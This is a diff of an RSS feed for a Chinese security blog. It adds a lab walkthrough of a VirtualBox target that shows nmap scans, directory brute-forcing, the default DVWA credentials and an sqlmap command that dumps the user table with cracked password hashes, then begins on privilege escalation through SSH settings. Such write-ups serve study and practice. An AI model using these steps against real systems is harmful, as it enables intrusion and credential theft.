@@ -1,5 +1,82 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>嫉妒能让你前进，但也能让你陷入深渊。</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Tue, 02 Dec 2025 06:47:19 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>needrestart提权</title><link>https://faabbi.github.io/post/needrestart-ti-quan.html</link><description>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>嫉妒能让你前进，但也能让你陷入深渊。</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Tue, 02 Dec 2025 06:47:59 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>Secure-MJ</title><link>https://faabbi.github.io/post/Secure-MJ.html</link><description># 信息收集
+
+```
+┌──(root㉿SPX-2017)-[/tmp/test]
+└─# nmap --min-rate 10000 -p- 192.168.2.102
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 16:25 CST
+Nmap scan report for 192.168.2.102 (192.168.2.102)
+Host is up (0.12s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:AA:43:D3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 12.11 seconds
+
+┌──(root㉿SPX-2017)-[/tmp/test]
+└─# nmap -sU --top-ports 20 192.168.2.102
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 16:25 CST
+Nmap scan report for 192.168.2.102 (192.168.2.102)
+Host is up (0.00096s latency).
+
+PORT      STATE         SERVICE
+53/udp    closed        domain
+67/udp    open|filtered dhcps
+68/udp    open|filtered dhcpc
+69/udp    closed        tftp
+123/udp   open|filtered ntp
+135/udp   open|filtered msrpc
+137/udp   closed        netbios-ns
+138/udp   closed        netbios-dgm
+139/udp   closed        netbios-ssn
+161/udp   open|filtered snmp
+162/udp   closed        snmptrap
+445/udp   closed        microsoft-ds
+500/udp   open|filtered isakmp
+514/udp   closed        syslog
+520/udp   open|filtered route
+631/udp   closed        ipp
+1434/udp  closed        ms-sql-m
+1900/udp  open|filtered upnp
+4500/udp  closed        nat-t-ike
+49152/udp closed        unknown
+MAC Address: 08:00:27:AA:43:D3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 7.43 seconds
+```
+仅此而已了
+```
+┌──(root㉿SPX-2017)-[/tmp/test]
+└─# dirsearch -u http://192.168.2.102/
+
+[16:27:15] 302 -    0B  - /dvwa/  -&gt;  login.php
+[16:27:16] 200 -    7B  - /file.php
+[16:27:21] 200 -   23KB - /phpinfo.php
+```
+有个dvwa，弱密码是`admin:password`
+进来难度拉到最低弹个shell就行,不过数据库也可以注一手，看看有没有信息
+```
+┌──(root㉿SPX-2017)-[/tmp/test]
+└─# sqlmap -u 'http://192.168.2.102/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit' --cookie='PHPSESSID=4ufjm6o9i7s26f198t7145o3pp; security=low' --batch --dump
+1       | admin   | /dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2025-11-29 06:43:35 | 0            |
+| 2       | gordonb | /dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2025-11-29 06:43:35 | 0            |
+| 3       | 1337    | /dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2025-11-29 06:43:35 | 0            |
+| 4       | pablo   | /dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2025-11-29 06:43:35 | 0            |
+| 5       | smithy  | /dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2025-11-29 06:43:35 | 0 
+```
+不过没什么信息，都是自带的弱密码
+
+# 提权
+
+## lzh
+
+可以看到sshd_config里的配置不允许root登录，公钥读，并且也关闭了权限检查
+
+
+**StrictModes=no：  
+禁用对用户 ~/.ssh 和 authorized_keys 文件的权限、所属者检查。</description><guid isPermaLink="true">https://faabbi.github.io/post/Secure-MJ.html</guid><pubDate>Tue, 02 Dec 2025 06:47:35 +0000</pubDate></item><item><title>needrestart提权</title><link>https://faabbi.github.io/post/needrestart-ti-quan.html</link><description>
 needrestart有过几个cve但是要求sudo的`env_reset`不能被启用，也就是不能清除环境变量
 
 更通用的提权时-c参数
